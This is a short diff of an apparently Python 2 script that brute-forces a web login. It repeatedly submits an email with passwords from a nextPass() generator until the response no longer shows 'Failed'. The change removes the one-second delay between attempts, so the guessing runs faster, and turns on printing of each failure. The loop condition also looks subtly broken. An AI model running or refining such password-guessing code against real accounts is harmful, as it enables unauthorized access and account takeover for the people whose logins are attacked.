@@ -26,8 +26,9 @@ httpResponse=urllib.urlopen(baseURL+"?"+encodeArgs)
 bt = BeautifulSoup(httpResponse.read())
 
 while bt.div.p.b.find("Failed"!=-1) :
-	time.sleep(1)
-	#print "login failed for "+str(args)
+	
+	#time.sleep(1)
+	print "login failed for "+str(args)
 	
 	args = {"email":user, "password": nextPass()}
 	encodeArgs = urllib.urlencode(args)
